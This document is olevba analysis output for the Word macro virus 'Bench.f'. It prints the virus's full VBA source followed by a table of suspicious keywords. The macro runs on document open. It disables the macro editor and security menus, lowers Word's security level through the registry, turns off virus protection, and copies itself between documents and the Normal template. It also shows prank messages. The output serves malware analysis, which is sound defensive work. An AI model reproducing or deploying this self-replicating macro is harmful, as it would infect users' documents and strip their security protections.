olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bench.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bench.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
MACRONAME = BENCH2
On Error Resume Next
Application.Options.ConfirmConversions = 1 - 1
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
With CommandBars("Tools")
    .Controls("Macro").Delete
    .Controls("Customize...").Delete
    .Controls("Templates and Add-Ins...").Delete
End With
CommandBars("Format").Controls("Style...").Enabled = 0: CommandBars("View").Controls("Toolbars").Enabled = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If Application.Version = 9# Then
CommandBars("Macro").Controls("Security...").Delete
Else
With Application.Options
    .VirusProtection = 1 - 1
    .SaveNormalPrompt = 1 - 1
End With
End If
AI = False: NI = False
Set AL = ActiveDocument.VBProject.vbcomponents.Item(1): Set NL = NormalTemplate.VBProject.vbcomponents.Item(1)
A_AmIReAL = AL.CodeModule.Lines(2, 1): N_AmIReal = NL.CodeModule.Lines(2, 1)
If UCase(A_AmIReAL) = "MACRONAME = BENCH2" Then AI = True: If UCase(N_AmIReal) = "MACRONAME = BENCH2" Then NI = True
If AI = True And NI = True Then GoTo 0
Application.ScreenUpdating = 1 - 1
If AI = False Then
himala = AL.CodeModule.Countoflines
torpedo = NL.CodeModule.Countoflines
If himala > 0 Then AL.CodeModule.Deletelines 1, himala
With AL.CodeModule
    .addfromstring ("Sub AutoOpen()" & vbCr & NL.CodeModule.Lines(2, torpedo))
End With
End If
If NI = False Then
Luha = AL.CodeModule.Countoflines
Exodus = NL.CodeModule.Countoflines
If Exodus > 0 Then NL.CodeModule.Deletelines 1, Exodus
With NL.CodeModule
.addfromstring ("Sub AutoClose()" & vbCr & AL.CodeModule.Lines(2, Luha))
End With
End If
0:
If MacroContainer = ActiveDocument Then
If Minute(Now) >= 25 And Minute(Now) <= 40 Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "[Bench]"
        .Text = "I'm not suffering from insanity! I'm enjoying every minute of it!"
        .Show
    End With
ActiveDocument.Content.Font.Animation = wdAnimationShimmer
ElseIf Minute(Now) > 40 And Minute(Now) <= 59 Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "Defend your PC's privacy!"
        .Text = "Boycott Intel!" & vbCr & "http://www.bigbrotherinside.com"
        .Animation = msoAnimationGetAttentionMajor
        .Show
    End With
End If
End If
If NI = True And AI = False And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.bigbrothe|URL                                          |
|          |rinside.com         |                                             |
+----------+--------------------+---------------------------------------------+

